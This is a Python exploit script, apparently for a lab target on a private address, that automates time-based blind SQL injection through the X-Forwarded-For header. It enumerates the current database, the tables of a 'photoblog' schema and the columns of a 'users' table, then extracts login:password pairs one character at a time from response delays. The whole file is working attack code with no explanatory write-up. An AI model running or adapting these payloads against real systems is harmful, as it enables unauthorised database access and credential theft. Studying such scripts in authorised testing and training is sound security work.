#!/usr/bin/python3
from pwn import *
import requests, time, sys, string, signal

def def_handler(sig, frame):
    print("\n\nK, bye ")
    sys.exit(1)
        
#Ctrl+C    
signal.signal(signal.SIGINT, def_handler)

# Global Variables
url = "http://192.168.74.131/"
alfa_num_characters = string.ascii_lowercase + string.digits + ':'
#characters = string.ascii_lowercase
#hex_characters = "abcdef:" + string.digits

def injection(query):
    
    progress = log.progress("Payload")
    progress.status("Starting")
    time.sleep(1)

    X_header = {"X-Forwarded-For" : "127.0.0.1"}

    exfiltrated = ""

    index = 1
    db = 0
    while db < 4:
        exfil_progress = log.progress("Exfiltrated")
        while True:
            starting_length = len(exfiltrated)
            for character in alfa_num_characters:

                time.sleep(0.1)
                if "limit" in query:
                    X_header["X-Forwarded-For"] = query % (db, index, character)
                else:
                    X_header["X-Forwarded-For"] = query % (index, character)
                    db = 5

                progress.status(X_header["X-Forwarded-For"])

                time_start = time.time()
                r = requests.get(url, headers=X_header)
                time_end = time.time()

                if time_end - time_start > 1:
                    exfiltrated += character
                    exfil_progress.status(exfiltrated)
                    break

            if starting_length < len(exfiltrated):
                index += 1
            else:
                break
        exfil_progress.success(exfiltrated)
        exfiltrated = ""
        index = 1
        if "columns" in query and db > 1:
            db = 5
        db += 1
            
    progress.success(X_header["X-Forwarded-For"])




if __name__ == "__main__":

    print("Current Database:")
    print(17*'-')
    injection("127.0.0.1' or if(substring(database(),%d,1)='%s',sleep(1),1)#")
    print()
    print("Tables in [photoblog]:")
    print(22*'-')
    injection("' | if(substring((select table_name from information_schema.tables where table_schema='photoblog' limit %d,1),%d,1)='%s',sleep(1),1)#")
    print()
    print("Columns for [users]:")
    print(20*'-')
    injection("' or if(substring((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1)='%s',sleep(1),1)#")
    print()
    print("Credentials:")
    print(12*'-')
    injection("' + if(substring((select concat(login,':',password) from users),%d,1)='%s',sleep(1),1)#")
    print()
